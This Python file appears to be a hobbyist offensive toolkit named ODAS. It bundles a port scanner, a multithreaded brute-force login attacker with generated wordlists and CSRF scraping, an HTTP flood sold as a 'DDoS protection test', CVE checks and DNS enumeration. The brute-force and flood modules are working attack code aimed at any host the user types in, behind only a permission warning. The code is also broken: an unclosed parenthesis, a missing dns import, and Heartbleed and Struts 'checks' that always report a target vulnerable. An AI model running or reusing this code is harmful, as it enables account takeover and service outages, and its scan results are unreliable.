#!/usr/bin/env python3

import subprocess
import sys
import os
import socket
import threading
import time
import random
import string
import logging
from queue import Queue
import argparse
import ssl
import json
import re
import ipaddress
import concurrent.futures
from urllib.parse import urlparse

# Auto-install missing dependencies
def install_package(pkg):
    print(f"[i] Package '{pkg}' not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    install_package("requests")
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import colorama
    from colorama import Fore, Style
    colorama.init()
except ImportError:
    install_package("colorama")
    import colorama
    from colorama import Fore, Style
    colorama.init()

# Constants
DEFAULT_THREADS = 50
LOG_FILE = "pentest_tool.log"
VERSION = "2.0"
AUTHOR = "Reborn ODAS"
Contribute ="Open AI,Deep Seek, GitHub Copilot"
BANNER = f"""
{Fore.CYAN}
      ___  ___  ___   ___
    / __ \/ _ \/ _ | / __/
   / /_/ / // / __ |_\ \  
   \____/____/_/ |_/___/ v2.0
                       
{Style.RESET_ALL}
Version: {VERSION} | Author: {AUTHOR} \nContributeBy: {Contribute}
"""

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format=f'{Fore.GREEN}[%(asctime)s]{Style.RESET_ALL} %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()

# === CREDENTIAL GENERATOR ===
def generate_credentials(user_file="users.txt", pass_file="passwords.txt", count=100):
    """Generate realistic credentials using common patterns"""
    common_users = ["admin", "root", "user", "test", "guest", "administrator"]
    common_passwords = ["password", "123456", "admin123", "letmein", "welcome", "Password1!"]
    
    usernames = set(common_users)
    passwords = set(common_passwords)

    # Load existing files
    if os.path.exists(user_file):
        with open(user_file, "r") as f:
            usernames.update(line.strip() for line in f if line.strip())
    if os.path.exists(pass_file):
        with open(pass_file, "r") as f:
            passwords.update(line.strip() for line in f if line.strip())

    new_users = []
    new_passes = []

    # Generate additional usernames
    while len(new_users) < count:
        if random.random() < 0.5:
            # Pattern-based username
            patterns = [
                f"{random.choice(['admin', 'user', 'test'])}_{random.randint(100, 999)}",
                f"{random.choice(['dev', 'prod', 'staging'])}_{random.choice(['user', 'admin'])}",
                f"{random.choice(['john', 'jane', 'bob', 'alice'])}.{random.choice(['doe', 'smith'])}"
            ]
            uname = random.choice(patterns)
        else:
            # Random username with special characters
            charset = string.ascii_letters + string.digits + "!@#$%^&*()_-+="
            uname = ''.join(random.choices(charset, k=random.randint(8, 14)))

        if uname not in usernames:
            usernames.add(uname)
            new_users.append(uname)

    # Generate additional passwords
    while len(new_passes) < count:
        if random.random() < 0.5:
            # Pattern-based strong password
            patterns = [
                f"{random.choice(['Summer', 'Winter', 'Spring'])}{random.randint(2020, 2025)}{random.choice('!@#')}",
                f"{random.choice(['P@ssw0rd', 'Secur3', 'Safe'])}{random.randint(1, 99)}",
                f"{random.choice(['Admin', 'Root', 'User'])}@{random.randint(1000, 9999)}"
            ]
            pwd = random.choice(patterns)
        else:
            # Fully random strong password
            charset = string.ascii_letters + string.digits + "!@#$%^&*()_-=+[]{}|;:,.<>/?~"
            pwd = ''.join(random.choices(charset, k=random.randint(12, 20)))

        if pwd not in passwords:
            passwords.add(pwd)
            new_passes.append(pwd)

    # Save to files
    with open(user_file, "a") as uf:
        for u in new_users:
            uf.write(u + "\n")
    with open(pass_file, "a") as pf:
        for p in new_passes:
            pf.write(p + "\n")

    logger.info(f"{len(new_users)} new usernames written to {user_file}")
    logger.info(f"{len(new_passes)} new passwords written to {pass_file}")
    return new_users, new_passes

# === MODULE 1: Enhanced Port Scanner ===
def port_scan_worker(host, port_queue, results, timeout=1.0):
    """Scan ports with service detection"""
    while not port_queue.empty():
        port = port_queue.get()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                if s.connect_ex((host, port)) == 0:
                    try:
                        service = socket.getservbyport(port, 'tcp')
                    except:
                        service = "unknown"
                    
                    # SSL detection
                    ssl_socket = None
                    try:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        ssl_socket = context.wrap_socket(s, server_hostname=host)
                        ssl_socket.connect((host, port))
                        ssl_version = ssl_socket.version()
                        ssl_socket.close()
                        service = f"ssl/{service} ({ssl_version})"
                    except:
                        pass
                    
                    result = f"{Fore.GREEN}OPEN{Style.RESET_ALL} {port}/tcp - {service}"
                    results.append(result)
                    logger.info(result)
        except Exception as e:
            logger.debug(f"Port scan error on {port}: {e}")
        finally:
            port_queue.task_done()

def port_scan(target, ports="1-1024", threads=DEFAULT_THREADS):
    """Scan target with custom port range"""
    logger.info(f"Scanning {target} ports {ports} with {threads} threads")
    
    # Parse port range
    if ports == "all":
        port_list = list(range(1, 65536))
    elif "-" in ports:
        start, end = map(int, ports.split("-"))
        port_list = list(range(start, end + 1))
    elif "," in ports:
        port_list = [int(p) for p in ports.split(",")]
    else:
        port_list = [int(ports)]
    
    port_queue = Queue()
    for port in port_list:
        port_queue.put(port)
    
    results = []
    thread_pool = []
    
    for _ in range(min(threads, len(port_list))):
        t = threading.Thread(target=port_scan_worker, args=(target, port_queue, results))
        t.daemon = True
        t.start()
        thread_pool.append(t)
    
    port_queue.join()
    return results

# === MODULE 2: Advanced Brute Force Login ===
def brute_worker(url, username_queue, passwords, field_names, results, timeout=5):
    """Brute force worker with customizable form fields"""
    while not username_queue.empty():
        try:
            user = username_queue.get(timeout=2)
            for pwd in passwords:
                try:
                    payload = {
                        field_names.get('username', 'username'): user,
                        field_names.get('password', 'password'): pwd,
                        **field_names.get('extra', {})
                    }
                    
                    res = requests.post(
                        url, 
                        data=payload, 
                        timeout=timeout,
                        verify=True,
                        allow_redirects=True
                    )
                    
                    # Check for success patterns
                    if res.status_code in [200, 301, 302]:
                        if "logout" in res.text.lower() or "welcome" in res.text.lower():
                            result = f"{Fore.GREEN}SUCCESS{Style.RESET_ALL} -> {user}:{pwd} (Status: {res.status_code})"
                            results.append(result)
                            logger.info(result)
                            return
                except requests.RequestException as e:
                    logger.debug(f"Request error for {user}:{pwd} -> {e}")
        finally:
            username_queue.task_done()

def brute_force_login(url, usernames, passwords, threads=DEFAULT_THREADS, field_config=None):
    """Advanced brute force with field customization and enhanced detection"""
    logger.info(f"Starting brute-force on {url} with {len(usernames)} users and {len(passwords)} passwords")
    
    # Create a session for cookie persistence
    session = requests.Session()
    session.verify = False  # Ignore SSL errors
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    })
    
    # Attempt to get initial cookies and CSRF token
    csrf_token = None
    try:
        logger.info("Fetching initial page for session cookies...")
        response = session.get(url, timeout=5)
        if response.status_code == 200:
            # Try to extract CSRF token from common locations
            if '<input type="hidden" name="csrf_token"' in response.text:
                csrf_token = re.search(r'name="csrf_token" value="([^"]+)"', response.text).group(1)
            elif '<meta name="csrf-token"' in response.text:
                csrf_token = re.search(r'content="([^"]+)"', response.text).group(1)
            if csrf_token:
                logger.info(f"Discovered CSRF token: {csrf_token[:15]}...")
    except Exception as e:
        logger.warning(f"Pre-request failed: {str(e)}")
    
    username_queue = Queue()
    for u in usernames:
        username_queue.put(u)
    
    results = []
    thread_pool = []
    found_event = threading.Event()  # Event to signal found credentials
    
    # Default field configuration
    if not field_config:
        field_config = {
            'username': 'username',
            'password': 'password',
            'extra': {}
        }
    
    # Add CSRF token to extra fields if found
    if csrf_token and 'csrf_token' not in field_config['extra']:
        field_config['extra']['csrf_token'] = csrf_token
    
    def worker():
        """Worker thread for brute forcing"""
        local_session = requests.Session()
        local_session.verify = True
        local_session.headers.update(session.headers

# Copy cookies from main session
        for cookie in session.cookies:
            local_session.cookies.set(cookie.name, cookie.value)
        
        while not username_queue.empty() and not found_event.is_set():
            try:
                user = username_queue.get(timeout=2)
                for pwd in passwords:
                    if found_event.is_set():
                        break
                    
                    payload = {
                        field_config['username']: user,
                        field_config['password']: pwd,
                        **field_config['extra']
                    }
                    
                    try:
                        res = local_session.post(
                            url, 
                            data=payload,
                            timeout=10,
                            allow_redirects=True
                        )
                        
                        # Enhanced success detection
                        success = False
                        
                        # 1. Check HTTP status codes
                        if res.status_code in [200, 301, 302]:
                            # 2. Check for common success indicators in content
                            success_indicators = [
                                "logout", "welcome", "dashboard", 
                                "my account", "sign out", "log out",
                                user.lower()  # Username appearing on page
                            ]
                            
                            content_lower = res.text.lower()
                            if any(indicator in content_lower for indicator in success_indicators):
                                success = True
                            
                            # 3. Check for failed login messages absence
                            failure_indicators = [
                                "invalid", "incorrect", "error", 
                                "try again", "login failed"
                            ]
                            if any(indicator in content_lower for indicator in failure_indicators):
                                success = False
                            
                            # 4. Check for session cookies
                            if "session" in local_session.cookies.get_dict():
                                success = True
                        
                        if success:
                            result = f"{Fore.GREEN}SUCCESS{Style.RESET_ALL} -> {user}:{pwd} (Status: {res.status_code})"
                            results.append(result)
                            logger.info(result)
                            found_event.set()  # Signal other threads to stop
                            return
                        else:
                            logger.debug(f"Failed -> {user}:{pwd}")
                            
                    except requests.RequestException as e:
                        logger.debug(f"Request error for {user}:{pwd} -> {str(e)}")
                    time.sleep(0.2)  # Rate limiting
            except Exception as e:
                logger.debug(f"Thread error: {str(e)}")
            finally:
                username_queue.task_done()
    
    # Create worker threads
    for _ in range(min(threads, len(usernames))):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_pool.append(t)
    
    # Wait for completion or credential found
    username_queue.join()
    
    if not found_event.is_set():
        logger.info(f"{Fore.YELLOW}Brute force complete. No valid credentials found.{Style.RESET_ALL}")
    else:
        logger.info(f"{Fore.GREEN}Valid credentials found! Stopping brute force.{Style.RESET_ALL}")
    
    return results

# === MODULE 3: Smart DDoS Protection Tester ===
def http_flood(target, port, duration, threads=DEFAULT_THREADS):
    """HTTP flood with realistic user agents"""
    logger.info(f"Starting HTTP flood on {target}:{port} for {duration}s")
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    ]
    
    stop_time = time.time() + duration
    request_count = 0
    
    def flood():
        nonlocal request_count
        while time.time() < stop_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendall(
                    f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Connection: keep-alive\r\n\r\n".encode()
                )
                request_count += 1
                time.sleep(0.01)
            except:
                time.sleep(0.1)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(flood) for _ in range(threads)]
        concurrent.futures.wait(futures, timeout=duration)
    
    logger.info(f"Sent {request_count} requests in {duration} seconds")
    return request_count

# === MODULE 4: Vulnerability Scanner ===
CVE_CHECKS = {
    "CVE-2014-0160": {
        "name": "Heartbleed",
        "port": 443,
        "check": lambda s: s.send(b"\x16\x03\x01\x00\xdc\x01\x00\x00\xd8\x03\x03") and True
    },
    "CVE-2017-5638": {
        "name": "Apache Struts RCE",
        "port": 80,
        "check": lambda s: s.send(b"GET / HTTP/1.1\r\nContent-Type: %{(#_='multipart/form-data').") and True
    }
}

def check_cves(target, port=None):
    """Check for common vulnerabilities"""
    logger.info(f"Scanning {target} for known vulnerabilities")
    results = []
    
    for cve, data in CVE_CHECKS.items():
        check_port = port if port else data["port"]
        try:
            with socket.create_connection((target, check_port), timeout=3) as s:
                if data["check"](s):
                    result = f"{Fore.RED}VULNERABLE{Style.RESET_ALL} {cve} - {data['name']}"
                    results.append(result)
                    logger.warning(result)
        except Exception as e:
            logger.debug(f"CVE check failed for {cve}: {e}")
    
    if not results:
        logger.info(f"{Fore.GREEN}No known vulnerabilities detected{Style.RESET_ALL}")
    return results

# === MODULE 5: Network Reconnaissance ===
def dns_enumeration(target):
    """Perform DNS reconnaissance"""
    logger.info(f"Starting DNS enumeration for {target}")
    results = []
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
    
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(target, rtype)
            for rdata in answers:
                result = f"{rtype} record: {rdata.to_text()}"
                results.append(result)
                logger.info(result)
        except Exception as e:
            logger.debug(f"DNS query failed for {rtype}: {e}")
    
    return results

# === REPORT GENERATOR ===
def generate_report(results, format="text"):
    """Generate comprehensive test report"""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"pentest_report_{timestamp}.{format}"
    
    if format == "json":
        with open(filename, "w") as f:
            json.dump(results, f, indent=2)
    else:  # text format
        with open(filename, "w") as f:
            f.write(f"Penetration Test Report - {timestamp}\n")
            f.write("=" * 50 + "\n\n")
            for section, data in results.items():
                f.write(f"{section.upper()}:\n")
                f.write("-" * 50 + "\n")
                for item in data:
                    # Remove color codes for text file
                    clean_item = re.sub(r'\x1b\[[0-9;]*m', '', item)
                    f.write(f"• {clean_item}\n")
                f.write("\n")
    
    logger.info(f"Report generated: {filename}")
    return filename

# === RUNTIME INPUT FUNCTIONS ===
def get_target():
    while True:
        target = input(f"{Fore.CYAN}Enter target host (IP, domain, or URL): {Style.RESET_ALL}").strip()
        if target:
            # Extract hostname if URL is provided
            if "://" in target:
                try:
                    parsed = urlparse(target)
                    target = parsed.netloc.split(':')[0]  # Remove port if present
                except Exception:
                    logger.error("Invalid URL format")
                    continue
            
            try:
                ipaddress.ip_address(target)
                return target
            except ValueError:
                try:
                    socket.gethostbyname(target)
                    return target
                except socket.gaierror:
                    logger.error("Invalid domain or IP address")
        else:
            logger.error("Target cannot be empty")

def get_mode():
    modes = {
        "1": "scan",
        "2": "brute",
        "3": "ddos",
        "4": "vuln",
        "5": "all"
    }
    
    print(f"{Fore.YELLOW}Select mode:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1:{Style.RESET_ALL} Port Scan")
    print(f"{Fore.GREEN}2:{Style.RESET_ALL} Brute Force Login")
    print(f"{Fore.GREEN}3:{Style.RESET_ALL} DDoS Protection Test")
    print(f"{Fore.GREEN}4:{Style.RESET_ALL} Vulnerability Scan")
    print(f"{Fore.GREEN}5:{Style.RESET_ALL} All Tests")
    
    while True:
        mode = input(f"{Fore.CYAN}Enter mode (1-5): {Style.RESET_ALL}").strip()
        if mode in modes:
            return modes[mode]
        logger.error("Invalid mode. Choose 1-5")

def get_port():
    while True:
        port = input(f"{Fore.CYAN}Enter target port (default 80): {Style.RESET_ALL}").strip()
        if not port:
            return 80
        if port.isdigit() and 1 <= int(port) <= 65535:
            return int(port)
        logger.error("Invalid port. Must be 1-65535")

def get_duration():
    while True:
        duration = input(f"{Fore.CYAN}Enter test duration in seconds (default 10): {Style.RESET_ALL}").strip()
        if not duration:
            return 10
        if duration.isdigit() and int(duration) > 0:
            return int(duration)
        logger.error("Invalid duration. Must be positive integer")

def get_usercount():
    while True:
        count = input(f"{Fore.CYAN}Number of credentials to generate (default 20): {Style.RESET_ALL}").strip()
        if not count:
            return 20
        if count.isdigit() and int(count) > 0:
            return int(count)
        logger.error("Invalid number. Must be positive integer")

def get_output_format():
    while True:
        fmt = input(f"{Fore.CYAN}Report format [text/json] (default text): {Style.RESET_ALL}").strip().lower()
        if not fmt:
            return "text"
        if fmt in ["text", "json"]:
            return fmt
        logger.error("Invalid format. Choose 'text' or 'json'")

# === MAIN FUNCTION ===
def main():
    print(BANNER)
    logger.info(f"Starting ODAS v{VERSION}")
    
    # Argument parsing
    parser = argparse.ArgumentParser(description="Ethical Penetration Testing Tool", add_help=False)
    parser.add_argument("--help", action="store_true", help="Show help message")
    args, _ = parser.parse_known_args()
    
    if args.help:
        print(f"{Fore.CYAN}Usage:{Style.RESET_ALL}")
        print("  ./pentest.py [options]")
        print(f"\n{Fore.YELLOW}Options:{Style.RESET_ALL}")
        print("  --help            Show this help message")
        print("  --non-interactive Run in non-interactive mode (requires CLI params)")
        print("\nIn interactive mode (default), you'll be prompted for parameters")
        return
    
    # Runtime input collection
    logger.warning(f"{Fore.RED}WARNING: Use only on systems you own or have permission to test!{Style.RESET_ALL}")
    
    target = get_target()
    mode = get_mode()
    
    # Get mode-specific parameters
    port = 80
    if mode in ["scan", "ddos", "all"]:
        port = get_port()
    
    duration = 10
    if mode in ["ddos", "all"]:
        duration = get_duration()
    
    credentials = 20
    if mode in ["brute", "all"]:
        credentials = get_usercount()
    
    output_format = "text"
    output_format = get_output_format()
    
    # Validate target
    try:
        ipaddress.ip_address(target)
    except ValueError:
        try:
            socket.gethostbyname(target)
        except socket.gaierror:
            logger.error("Invalid target address or domain")
            sys.exit(1)
    
    results = {}
    threads = DEFAULT_THREADS
    
    # Generate credentials
    if mode in ["brute", "all"]:
        logger.info("Generating credentials...")
        users, passes = generate_credentials(count=credentials)
    
    # Port scanning
    if mode in ["scan", "all"]:
        logger.info("Starting port scan...")
        results['port_scan'] = port_scan(target, ports="1-1024", threads=threads)
    
    # Brute force
    if mode in ["brute", "all"]:
        logger.info("Starting brute force attack...")
        login_url = f"http://{target}:{port}/login"  # Adjust based on actual target
        brute_results = brute_force_login(
            login_url, 
            users, 
            passes, 
            threads=threads,
            field_config={
                'username': 'username',
                'password': 'password',
                'extra': {}
            }
        )
        results['brute_force'] = brute_results
    
    # DDoS testing
    if mode in ["ddos", "all"]:
        logger.info("Starting DDoS protection test...")
        request_count = http_flood(target, port, duration, threads)
        results['ddos_test'] = [f"Sent {request_count} requests in {duration} seconds"]
    
    # Vulnerability scanning
    if mode in ["vuln", "all"]:
        logger.info("Starting vulnerability scan...")
        results['vulnerabilities'] = check_cves(target, port)
    
    # DNS reconnaissance
    if mode in ["all"]:
        logger.info("Starting DNS enumeration...")
        results['dns_info'] = dns_enumeration(target)
    
    # Generate report
    report_file = generate_report(results, output_format)
    logger.info(f"{Fore.CYAN}Testing complete. Report saved to {report_file}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info(f"{Fore.YELLOW}\n Interrupted by user. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        logger.exception(f"{Fore.RED}Critical error: {e}{Style.RESET_ALL}")
        sys.exit(1)
